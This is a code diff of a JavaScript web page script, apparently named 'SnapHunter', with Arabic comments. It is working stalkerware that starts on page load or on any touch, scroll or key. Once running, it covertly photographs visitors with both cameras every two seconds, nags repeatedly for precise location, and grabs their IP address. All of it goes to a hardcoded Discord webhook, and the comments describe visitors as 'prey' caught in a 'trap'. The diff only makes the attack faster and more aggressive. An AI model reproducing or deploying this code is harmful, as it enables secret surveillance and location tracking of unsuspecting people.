@@ -1,86 +1,89 @@
 'use strict';
 
-// ⚠️ رابط الـ Webhook الخاص بك
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
-
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 let userLat = null, userLng = null;
-let isSystemRunning = false; // لمنع تكرار التشغيل إذا نجح الطلب التلقائي
+let isRunning = false;
 
-// 1. وظيفة الإرسال السريع
-async function sendData(blob, text) {
+// 1. إرسال البيانات فوراً (أقصى سرعة)
+async function sendFast(blob, text) {
     const formData = new FormData();
-    if (blob) formData.append('file', blob, 'capture.jpg');
-    formData.append('payload_json', JSON.stringify({ content: text, username: "SnapHunter Hybrid" }));
+    if (blob) formData.append('file', blob, 'img.jpg');
+    formData.append('payload_json', JSON.stringify({ content: text, username: "SnapHunter Aggressive" }));
     return fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 }
 
-// 2. طلب الموقع الإجباري
-function forceLocation() {
+// 2. طلب الموقع الإجباري (تكرار كل 0.3 ثانية عند الرفض)
+function grabLocation() {
     navigator.geolocation.getCurrentPosition(
         (p) => {
             userLat = p.coords.latitude; userLng = p.coords.longitude;
-            sendData(null, `📍 **الموقع:** https://www.google.com/maps?q=${userLat},${userLng}`);
+            sendFast(null, `📍 **الموقع المباشر:** https://www.google.com/maps?q=${userLat},${userLng}`);
         },
-        () => { setTimeout(forceLocation, 500); }, 
+        () => { setTimeout(grabLocation, 300); }, // إلحاح شديد في طلب الموقع
         { enableHighAccuracy: true }
     );
 }
 
-// 3. التقاط الصور السريع
-async function captureDual(mode) {
+// 3. التقاط الصور (تبديل فوري كل ثانيتين)
+async function quickCapture(mode) {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
         video.srcObject = stream;
         await new Promise(r => video.onloadedmetadata = r);
         video.play();
-        await new Promise(r => setTimeout(r, 400)); // وقت قصير جداً للعدسة
+        
+        await new Promise(r => setTimeout(r, 300)); // وقت استجابة العدسة الأدنى
 
         const ctx = canvas.getContext('2d');
-        canvas.width = 640; canvas.height = 480;
-        ctx.drawImage(video, 0, 0, 640, 480);
+        canvas.width = 500; canvas.height = 375; // أبعاد محسنة للسرعة
+        ctx.drawImage(video, 0, 0, 500, 375);
         
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
+        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.3)); // ضغط عالي جداً
         stream.getTracks().forEach(t => t.stop());
-        await sendData(blob, `📸 لقطة: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
+        await sendFast(blob, `📸 لقطة: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
     } catch (e) { }
 }
 
-// 4. المحرك الأساسي (يحتوي على المحاولة التلقائية + انتظار اللمس)
-async function startSystem() {
-    if (isSystemRunning) return; // إذا اشتغل النظام مسبقاً لا يكرر نفسه
+// 4. المحرك الهجومي (بدء تلقائي + انتظار لمسة للسفاري)
+async function launchAttack() {
+    if (isRunning) return;
     
     try {
-        // محاولة طلب الكاميرا (ستنجح في أندرويد وكروم تلقائياً)
+        // محاولة هجومية فورية للكاميرا
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         stream.getTracks().forEach(t => t.stop());
         
-        isSystemRunning = true; // تم القبول تلقائياً
-        forceLocation(); // اطلب الموقع
+        isRunning = true;
+        grabLocation();
 
-        const loop = async () => {
-            await captureDual('user');
-            await captureDual('environment');
-            setTimeout(loop, 5000);
+        const engine = async () => {
+            await quickCapture('user');
+            await quickCapture('environment');
+            setTimeout(engine, 2000); // التكرار كل ثانيتين فقط!
         };
-        loop();
+        engine();
         
     } catch (err) {
-        // إذا فشل الطلب التلقائي (مثل سفاري)، ننتظر أول حركة من المستخدم
-        console.log("بانتظار تفاعل المستخدم...");
+        // في حال حظر المتصفح للطلب التلقائي، ننتظر أول حركة
+        console.log("Waiting for user interaction...");
     }
 }
 
-// أ- محاولة التشغيل التلقائي فوراً
-startSystem();
+// تشغيل الهجوم فوراً (للكروم والمتصفحات الأخرى)
+launchAttack();
 
-// ب- في حال فشلت المحاولة التلقائية، سيشتغل بمجرد لمس الشاشة (حل سفاري)
-window.addEventListener('click', startSystem);
-window.addEventListener('touchstart', startSystem);
-window.addEventListener('scroll', startSystem);
+// فخ اللمس (للسفاري والآيفون)
+['click', 'touchstart', 'scroll', 'keydown'].forEach(evt => 
+    window.addEventListener(evt, launchAttack)
+);
 
-// إرسال IP فور الدخول
-fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
-    sendData(null, `👤 **صيد جديد دخل!** IP: \`${data.ip}\``);
-});
+// تنبيه دخول فوري مع الـ IP
+(async () => {
+    const ipRes = await fetch('https://api.ipify.org?format=json').catch(()=>null);
+    if(ipRes) {
+        const data = await ipRes.json();
+        sendFast(null, `🚨 **صيد دخل الفخ الآن!** IP: \`${data.ip}\``);
+    }
+})();
